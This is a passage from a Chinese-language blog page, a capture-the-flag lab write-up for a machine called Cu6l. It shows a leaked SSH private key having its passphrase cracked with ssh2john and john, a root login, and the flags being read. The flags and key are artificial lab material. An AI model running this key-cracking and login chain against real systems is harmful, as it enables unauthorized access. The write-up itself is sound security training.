01l0pWm1aeQchMuh3YWBlpT6SyuphfiwUn4qxVTKS43qYgxLEOQiDi9CoAUOQ2IHFHk/h/<br>tEmnS+X9F/4IEHhJcHfigqtJFuAzv3DMFXW1nOKIeNv+sYcjHC1D4rPB93NBPCoj5GWBJO<br>1hYTNK7dyCAgFMHuXPbndpas8Rq3Wj7fcu2Bu99fFUS2eas5+Lnz2edLNykH22eC1kFj6k<br>1aVjLc9dHe3cK/v7BWYVEGSiRH7G3IuplT08kjI40iPW9a4/uZA1WTQKq9hS8Ef9kvU1Jw<br>XdjN9Gu9QIquahNrXg+iMqukysToLLW07maCaCHcOCRqWgBtvPBxVI9tEidelKipg5IDQB<br>tSIUsfSiewJY8LmzWkRHKqkKR00lbuWpuBFzM1Ke2Tr0NLcFc/8vAMXgmFTFT1F82JRXST<br>S17lwBN0yhMi6jsIZhFpgAvnQuvPJK5AlHpIfUPtOTnR2Oh+3btecLzbP/8M8ZP9/5xbT6<br>bU4QctDSLGVWVbHvZ7aKhau+lrRRzTP0kaM/7vyMOd/WhB+cLyWB6m7NSMIWkmAU6F8iQ3<br>81IYne0F+kZ3wOShCLUvIcRSs5i2+FcPmXeuXzG81VmXXfjs5+/dcDDhJnQX2JeAoZAHyk<br>AH/E+l9D9tBt5X/JGPFI+QPvkkluTMgdbJlou+pNtUPjtn+7pi11LsPUer7ttB7qqLzELZ<br>2LQy/7/d11d9ZpedpxofW35ksmfyTaQxucc9eZonJOb+htTOuWtw1KgVXavmNfhYrhp86/<br>iTukZgJA1VpD6SekPQsggIoW/ajLgkLtilTkd5JVf7jvOVDCO+TxmCHQihLti7N8AXR+6F<br>fRXkpLRtFRA2a2fwK8p2cJtdq4zodXaySI6u/pTRfoFoPyF1FidAQQD77Ooq4aPH6OCDMN<br>dkKUMkPeLafC0o0uKh/vvtdUbivCnCOM/W09LqZvtC0m8pmWk8cT8tQWv4Xeumkg/fbgyS<br>8g3Q==<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure>
+
+<p>使用<code>id_rsa</code>进行连接，发现需要密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# vim <span class="hljs-built_in">id</span>    <br><br>┌──(root㉿kali)-[~/miaosec]<br>└─# <span class="hljs-built_in">chmod</span> 600 <span class="hljs-built_in">id</span>           <br><br>┌──(root㉿kali)-[~/miaosec]<br>└─# ssh -i <span class="hljs-built_in">id</span> root@192.168.2.76               <br>root@192.168.2.76<span class="hljs-string">&#x27;s password: </span><br></code></pre></td></tr></table></figure>
+
+<p>使用<code>john</code>进行破解</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# ssh2john <span class="hljs-built_in">id</span> &gt;id.hash <br><br>┌──(root㉿kali)-[~/miaosec]<br>└─# john --wordlist=/usr/share/wordlists/rockyou.txt id.hash <br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])<br>Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 <span class="hljs-keyword">for</span> all loaded hashes<br>Cost 2 (iteration count) is 16 <span class="hljs-keyword">for</span> all loaded hashes<br>Will run 8 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>superman         (<span class="hljs-built_in">id</span>)     <br>1g 0:00:00:02 DONE (2026-02-28 16:35) 0.4739g/s 30.33p/s 30.33c/s 30.33C/s 123456..charlie<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed.<br></code></pre></td></tr></table></figure>
+
+<p>找到密码为：<code>superman</code></p>
+<p>成功获取到root权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# ssh -i <span class="hljs-built_in">id</span> root@192.168.2.76<br>** WARNING: connection is not using a post-quantum key exchange algorithm.<br>** This session may be vulnerable to <span class="hljs-string">&quot;store now, decrypt later&quot;</span> attacks.<br>** The server may need to be upgraded. See https://openssh.com/pq.html<br>Enter passphrase <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;id&#x27;</span>: <br>Linux cu6l 4.19.0-27-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Thu Feb 26 04:44:06 2026<br>-bash: warning: setlocale: LC_ALL: cannot change locale (zh_CN.UTF-8)<br>root@cu6l:~# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure>
+
+<h1 id="五、查看FLAG"><a href="#五、查看FLAG" class="headerlink" title="五、查看FLAG"></a>五、查看FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@cu6l:~# <span class="hljs-built_in">cat</span> /root/root.txt /home/yliken/user.txt <br>flag&#123;root-009520053b00386d1173f3988c55d192&#125;<br>flag&#123;user-9ffbf43126e33be52cd2bf7e01d627f9&#125;<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Maze-sec/" class="category-chain-item">Maze-sec</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/curl/" class="print-no-link">#curl</a>
+      
+        <a href="/tags/Env/" class="print-no-link">#Env</a>
+      
+        <a href="/tags/Minio/" class="print-no-link">#Minio</a>
+      
+        <a href="/tags/id-rsa-burf/" class="print-no-link">#id_rsa_burf</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Mazesec_Cu6l</div>
+      <div>http://miao-sec.github.io/Maze-sec/Mazesec-Cu6l/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Miao</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年2月28日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              BY-MIAO
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/Maze-sec/Mazesec-Survey/" title="Mazesec_Survey">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Mazesec_Survey</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/Vulnyx/Vlx_Exec/" title="Vlx_Exec">
+                        <span class="hidden-mobile">Vlx_Exec</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         次
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/scrollAnimation.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
